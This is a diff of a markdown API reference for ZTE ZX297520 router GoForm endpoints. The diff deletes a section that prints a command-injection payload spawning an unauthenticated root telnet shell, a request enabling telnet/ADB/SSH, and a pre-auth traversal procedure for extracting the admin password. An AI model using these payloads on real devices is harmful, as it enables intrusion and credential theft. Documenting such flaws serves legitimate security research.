@@ -1,4 +1,4 @@
-# ZTE ZX297520 / K12 GoForm API & Command Injection Reference
+# ZTE ZX297520 / K12 GoForm API Reference
 
 The GoAhead web backend on ZX297520 devices provides two primary endpoints:
 * **`GET /goform/goform_get_cmd_process`** (Query parameters / status)
@@ -97,40 +97,3 @@ Content-Type: application/x-www-form-urlencoded; charset=UTF-8
 
 isTest=false&goformId=CONNECT_NETWORK
 ```
-
----
-
-## 3. Shell Access & Privilege Escalation Vectors
-
-### 3.1 Vector 1: Command Injection via `REMOVE_WHITE_SITE`
-In unpatched firmware, the `REMOVE_WHITE_SITE` goform handler interpolates `ids` into a `system()` call without input validation.
-
-**Payload**:
-```http
-POST /goform/goform_set_cmd_process HTTP/1.1
-Host: <ROUTER_IP>
-Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-
-isTest=false&goformId=REMOVE_WHITE_SITE&ids=test%22%20%3B%20telnetd%20-l%20%2Fbin%2Fash%20%23
-```
-*Decoded payload*: `test" ; telnetd -l /bin/ash #`
-*Result*: Starts Busybox `telnetd` on port 23, spawning a root shell (`/bin/ash`) without authentication.
-
-### 3.2 Vector 2: Debug Mode & ADB/Telnet Enabling via `TZ_CMD_SECURE_LOGIN`
-**Request**:
-```http
-POST /goform/goform_set_cmd_process HTTP/1.1
-Host: <ROUTER_IP>
-Content-Type: application/x-www-form-urlencoded; charset=UTF-8
-
-isTest=false&goformId=TZ_CMD_SECURE_LOGIN&telnetdEnable=y&adbEnable=y&dropbearEnable=y
-```
-
-### 3.3 Vector 3: Pre-Auth File Rename & Password Extraction
-If administrative credentials are unknown, the `zte_httpshare` directory traversal vulnerability allows moving NVRAM backup to a readable web path:
-
-1. Rename `/etc_rw/nv/backup` to `/etc_rw/nv/qrcode_ssid_wifikey.png`.
-2. Move directory `/etc_rw/nv` to `/etc_rw/wifi`.
-3. Fetch `http://<ROUTER_IP>/img/qrcode_ssid_wifikey.png/cfg`.
-4. Parse `admin_Password=<password>\x00`.
-5. Restore paths to original locations.
